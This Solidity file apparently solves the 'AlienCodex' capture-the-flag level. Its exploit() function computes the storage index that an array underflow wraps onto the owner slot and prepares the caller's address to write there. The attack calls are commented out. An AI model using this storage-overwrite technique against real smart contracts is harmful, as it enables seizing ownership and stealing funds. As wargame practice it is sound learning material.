// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel19.sol";

contract AlienHack {
    // AlienCodex level19 = AlienCodex(0x752dD58810d09984504e080098A0c3Cf26C9093e);

    function exploit() external {
        uint256 index = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        // level19.make_contact();
        // level19.retract();
        // level19.revise(index, myAddress);
    }
}
